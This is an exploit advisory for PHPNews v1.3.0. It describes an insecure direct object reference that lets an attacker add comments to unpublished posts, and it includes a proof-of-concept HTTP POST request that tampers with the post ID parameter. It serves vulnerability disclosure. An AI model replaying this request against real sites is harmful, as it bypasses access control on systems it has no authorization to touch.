# Exploit Title: PHPNews v1.3.0 - Insecure Direct Object Reference(IDOR)
## Date: 1/4/2024
## Vendor Homepage: https://sourceforge.net/projects/newsphp/files/PHPNews%201._/PHPNews%201.3.0/phpnews_1-3-0.zip/download
## Tested on: Debian Linux, Apache, Mysql
## Vendor: PHPNews
## Version: v1.3.0
## Exploit Description:
## PHPNews v1.3.0 suffers from IDOR - Broken Access Control Vulnerability allowing attackers to add comment to post that is unpublished(horizontal privilege escalation).

## ---------------------------------POC-----------------------------
```
POST /news.php?action=post HTTP/1.1
...
mid=2(CHANGE HERE)&name=user1&email=&website=http%3A%2F%2F&message=i+am+user1&submit=Add+Comment
```